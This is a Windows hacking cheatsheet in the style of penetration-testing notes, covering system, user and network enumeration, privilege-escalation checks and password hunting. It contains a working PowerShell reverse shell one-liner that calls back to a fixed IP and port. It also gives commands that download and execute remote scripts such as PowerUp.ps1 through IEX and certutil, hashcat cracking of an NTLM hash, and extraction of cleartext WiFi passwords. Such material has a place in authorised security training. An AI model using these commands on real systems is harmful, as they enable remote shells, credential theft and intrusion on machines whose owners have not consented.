# WINDOWS HACKING CHEATSHEET

<!--
##################################################################
##################################################################
-->

## System Enumeration

#### Show Powershell History of Current User

`type C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`

#### Show Patches

`wmic qfe get Caption,Description,HotFixID,InstalledOn`

#### Show Drives

`wmic logicaldisk get caption,Description,providername`

#### Find specific directory

`dir <Folder Name> /AD /s`

#### Find file containing keyword

`findstr /si password *.txt | *.xml | *.xls`

#### Find specific file name on system

`dir /a /s /b c:\*flag2.txt`

`dir /b/s *.txt`

`where /r c:\Windows *.exe *.dll`

#### Find Unquoted service paths

`wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """`

#### Allow execution of scripts in powershell

`Set-ExecutionPolicy unrestricted`

#### Show execution policy

`Get-ExecutionPolicy -List | Format-table -AutoSize`

#### Show system OS.

`systeminfo | findstr /B /C:"OS Name" /C:"OS Version"`

#### Show scheduled tasks.

`schtasks /query /fo LIST /v`

#### Show running processes.

`tasklist /SVC`

#### Show running services

`sc queryex type= service`

#### Show services that start at boot.

`net start`

#### Check Service Registry for weak permissions.

`accesschk.exe username hklm\system\currentcontrolset\services`

#### Show 3rd party drivers

`DRIVEQUERY`

### Check these files.

c:\sysprep.inf

c:\sysprep\sysprep.inf

c:\sysprep\sysprep.xml

c:\unattend.xml

%WINDIR%\Panther\Unattend\Unattended.xml

%WINDIR%\Panther\Unattended.xml

<!--
##################################################################
##################################################################
-->

## User Enumeration

#### Show User Privileges

`whoami /priv`

#### Show a Users Group

`whoami /groups`

#### List users in a group

`net localgroup administrator`

#### Show info on specified user

`net user administrator`

#### Show Active Users

`quser`

##### Show current user.

`echo %username%`

#### Show current user info.

`net user %username%`

#### Show accounts on system.

`net users`

#### Show unquoted service current user can run.

`wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """`

<!--
##################################################################
##################################################################
-->

## Network Enumeration

#### Show network interfaces.

`ipconfig /all`

#### Show routing table.

`route print`

#### Show ARP table.

`arp -a`

#### Show established connections.

`netstat -ano | findstr ESTABLISHED`

#### Show listening connections.

`netstat -ano | findstr LISTENING`

#### FIREWALL ENUMERATION

`netsh advfirewall firewall dump`

`netsh firewall show state`

`netsh firewall show config`

<!--
##################################################################
##################################################################
-->

## Shells

#### Powershell Reverse Shell One Liner

```
$client = New-Object System.Net.Sockets.TCPClient("192.168.25.31",7777);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

<!--
##################################################################
##################################################################
-->

## Passwords

#### Use cached creds Windows

`runas /u:Administrator cmd.exe /c findstr /si *.txt > C:\Users\offsec\Desktop\text.txt`

#### Cracking Windows Password Hash

_Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::_
_USERNAME:SID:LM(BLANK=aad3b435b51404eeaad3b435b51404ee):NTLM:::_

`hashcat -m 1000 -a 0 -o plain-pass.txt --remove file-with-hash.hash /usr/share/wordlists/rockyou.txt`

#### Find file containing keyword

`findstr /si password *.txt | *.xml | *.xls`

#### WiFi Passwords

Find AP SSID

`netsh wlan show profile`

Get Cleartext Pass

`netsh wlan show profile <SSID> key=clear`

Oneliner method to extract wifi passwords from all the access point.

`cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on`

<!--
##################################################################
##################################################################
-->

## Useful Commands

#### Windows spawn cmd and execute command

`cmd.exe /c echo "hello world"`

#### Windows download from web

`IEX(New-Object Net.WebClient).downloadString('http://10.9.3.23/PowerUp.ps1')`

#### Use certutil to download from web

`certutil.exe -urlcache -split -f "http://10.9.3.23/Advanced.exe" Advanced.exe`

#### Windows Powershell download from web

`powershell "IEX(New-Object Net.WebClient).downloadString('http://10.9.3.23/PowerUp.ps1')"`

#### Mount NFS v3

`mount -t nfs -o vers=3 $ip:/dir /mnt/dir`

#### Download via windows CMD

`powershell -c (new-object System.Net.WebClient).DownloadFile('http://192.168.25.31/privesc/accesschk.exe','C:\Users\GitService\Desktop\accesschk.exe')`

#### Search long output

`command |more`

#### Enumerate Services

`sc query servicename`

#### Control Services

Stop

`sc stop servicename`

Start

`sc start servicename`

#### Kick User Off

`logoff "ID from quser"`

#### ID process using a file

`handle /`

#### Use sysinternal tools live

`\\live.sysinternals.com\tools\toolname.exe`

#### Kill Process

`taskkill /IM executablename`

#### Show execution policy

`Get-ExecutionPolicy -List | Format-table -AutoSize`

#### Allow execution of scripts in powershell

`Set-ExecutionPolicy unrestricted`

#### Find Service Using Port

1. `netstat -ano | finstr "port of intrest"`
2. `tasklist | findstr "PID with port open"`

#### Permanently Delete Files

`cipher /w:PATH`

#### Check File Hash

`CertUtil -hashfile <path to file> MD5`
